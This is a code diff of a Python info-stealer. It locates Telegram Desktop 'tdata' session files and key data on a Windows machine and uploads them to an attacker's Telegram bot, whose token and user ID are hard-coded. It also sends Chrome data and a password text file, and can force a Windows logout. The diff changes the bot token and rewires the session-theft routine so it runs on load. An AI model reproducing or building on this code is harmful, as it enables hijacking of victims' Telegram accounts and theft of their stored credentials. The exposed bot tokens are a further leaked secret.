@@ -17,7 +17,7 @@ log_out = 0  # 1 - is on, 0 - is off
 
 
 user_id = 441449437
-token = '1384970894:AAFwU-7r8wwDR_Pg6thRoEaEddeQPUSK6fk'
+token = '911331866:AAFlisRSdl-vTOd5AN8BVfQpobo7FnU_vm8'
 name_ur_txt = 'pass.txt'
 
 
@@ -100,34 +100,7 @@ def getFileProperties(fname):
         pass
     return props
 
-tddir = []
-# tdata_path = []
-if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
-    # tg = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
-    tddir.append(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\')# = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
-    # tdata_path.append(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\')# = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
-    # version = "Version: " + str(getFileProperties(os.path.join(tg, "Telegram.exe"))["FileVersion"])
-    #user = pathusr + "\n" + tddir + "\nVersion: " + str(getFileProperties(os.path.join(tddir, "Telegram.exe"))["FileVersion"])
-    print("***OK Default TG folder has been found")
 
-for i in paths:
-    found = finddir(i)
-    if found != None and found != (pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
-        tddir.append(found)# = finddir(i)
-    # if tddir[1] is not None:
-    # print(getFileProperties("Telegram.exe"))
-    # version = "Version: " + str(getFileProperties(os.path.join(tddir[1], "Telegram.exe"))["FileVersion"])
-    # tdata_path.append(tddir[1] + '\\tdata\\')# = tddir[1] + '\\tdata\\'
-    # break
-   # else:
-   #      user = pathusr + "\n(TG not found)"
-   #      print("ERROR: Couldn't find 'Telegram Desktop' folder in " + i)
-   #      pass
-tdata_path =[]
-for i in tddir:
-    #print("test", i)
-    tdata_path.append(os.path.join(i, "tdata"))
-    #print(tdata_path)
 def logout_windows(bool):
     if bool:
         try:
@@ -152,27 +125,42 @@ def send_txt():
         pass
 
 
-def send_session_files():
-    for i in tdata_path:
-        user = getFileProperties(os.path.join(i[:-5],"Telegram.exe"))["FileVersion"]
-        #print(user)
-        for root, dirs, files in os.walk(i):
-            for dir in dirs:
-                if dir[0:15] == "D877F783D5D3EF8":
-                    mapsdir = os.path.join(i, dir)
-            for file in files:
-                if file[0:15] == "D877F783D5D3EF8":
-                    print("***OK Matched D877F783D5D3EF8 in " + i)
-                    pathd877 = os.path.join(i, file)
-                    bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=i + "\nVersion: " + user)
-                elif file == "maps":
-                    print("***OK Matched maps in " + i)
-                    bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'), caption=i + "\nVersion: " + user)
-                elif file == "key_datas":
-                    print("***OK Matched key_datas in " + i)
-                    pathd877 = os.path.join(i, file)
-                    bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=i + "\nVersion: " + user)
+def send_session_files(path):
+    user = getFileProperties(os.path.join(path[:-5],"Telegram.exe"))["FileVersion"]
+    #print(user)
+    for root, dirs, files in os.walk(path):
+        for dir in dirs:
+            if dir[0:15] == "D877F783D5D3EF8":
+                mapsdir = os.path.join(path, dir)
+        for file in files:
+            if file[0:15] == "D877F783D5D3EF8":
+                print("***OK Matched D877F783D5D3EF8 in " + path)
+                pathd877 = os.path.join(path, file)
+                bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=path + "\nVersion: " + user)
+            elif file == "maps":
+                print("***OK Matched maps in " + path)
+                bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'), caption=path + "\nVersion: " + user)
+            elif file == "key_datas":
+                print("***OK Matched key_datas in " + path)
+                pathkey = os.path.join(path, file)
+                bot.send_document(user_id, open(os.path.join(file, pathkey), 'rb'), caption=path + "\nVersion: " + user)
 
+
+if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
+    tddir = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\')
+    tdata_path = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata')
+    print("***OK Default TG folder has been found")
+    send_session_files(tdata_path)
+else:
+    print("ERROR: Telegram folder is not default. Continuing...")
+
+
+for i in paths:
+    found = finddir(i)
+    if found != None and found != (pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
+        tddir = found
+        tdata_path = (os.path.join(tddir, "tdata"))
+        send_session_files(tdata_path)
 
 
 def main():
@@ -180,7 +168,7 @@ def main():
         Chrome()
         bot.send_message(user_id, pathusr)
         send_txt()
-        send_session_files()
+        # send_session_files()
         logout_windows(log_out)
     except Exception as e:
         print('ERROR: Main function: ' + repr(e))
